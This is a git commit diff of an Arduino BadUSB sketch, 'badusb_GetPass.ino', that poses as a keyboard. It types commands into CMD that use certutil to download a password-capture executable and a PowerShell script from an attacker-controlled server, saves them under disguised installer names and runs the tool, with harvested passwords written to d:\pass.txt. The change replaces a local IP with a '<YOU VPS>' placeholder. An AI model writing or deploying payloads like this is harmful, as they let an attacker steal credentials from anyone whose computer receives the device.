eb65ec3d0a69dc4c3f51a0e755175bed1e61d811
kissgeek <34683107+kissgeek@users.noreply.github.com>
2020-07-03 12:45:54 +0800

    Update and rename mm.ino to badusb_GetPass.ino

--- badusb_GetPass.ino
+++ badusb_GetPass.ino
@@ -13,9 +13,9 @@ void setup()
   delay(500);
   Keyboard.println("CMD");
   delay(1000);
-  Keyboard.println("certutil -urlcache -split -f http:192.168.10.2/KissGeek/PASSTOOLS.EXE d:\\setup_11.5.0.exe");//下载密码截取工具
+  Keyboard.println("certutil -urlcache -split -f http:<YOU VPS>/KissGeek/PASSTOOLS.EXE d:\\setup_11.5.0.exe");//下载密码截取工具,因为开启了大小写混淆所以说这里要大写
   delay(10000);
-  Keyboard.println("certutil -urlcache -split -f http:192.168.10.2/KissGeek/PassUp.PS1 d:\\setup_11.5.0.PS1");//下载powershell脚本
+  Keyboard.println("certutil -urlcache -split -f http:<YOU VPS>/KissGeek/PassUp.PS1 d:\\setup_11.5.0.PS1");//下载powershell脚本
   delay(1000);
   Keyboard.println("d:\\SETUP_11.5.0.EXE ALL > d:\\pass.txt");//获取的密码放到pass.txt
   delay(500);
